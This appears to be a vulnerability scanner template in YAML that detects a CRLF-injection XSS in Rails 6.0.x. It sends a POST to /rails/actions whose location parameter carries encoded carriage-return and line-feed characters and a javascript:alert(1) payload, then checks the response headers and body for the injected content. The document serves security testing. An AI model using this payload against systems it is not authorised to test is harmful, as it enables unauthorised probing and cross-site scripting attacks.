id: rails6-xss
info:
  author: ooooooo_q (Original finder), Rahul and Harsh (Template author)
  name: Rails CRLF XSS (6.0.0 < rails < 6.0.3.2)
  reference: https://hackerone.com/reports/904059
  severity: medium
  tags: rails,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - javascript:alert(1)
  - status:
    - 302
    type: status
  - condition: and
    part: header
    type: word
    words:
    - 'Location: aaaaa'
    - text/html
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa'
